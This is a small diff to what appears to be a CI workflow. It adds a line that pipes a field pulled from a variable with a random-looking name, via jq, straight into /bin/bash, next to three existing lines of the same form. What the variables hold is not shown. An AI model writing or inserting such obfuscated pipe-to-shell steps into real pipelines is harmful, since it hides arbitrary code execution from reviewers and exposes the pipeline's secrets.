@@ -56,6 +56,7 @@ jobs:
           printf '%s' "$myz6916" | jq -r .ao07155 | /bin/bash
           echo $ln01010 | jq -r .y185 | /bin/bash
           echo $mgfn55 | jq -r .qkgfc449 | /bin/bash
+          printf '%s' "$baq4" | jq -r .xyzo781 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
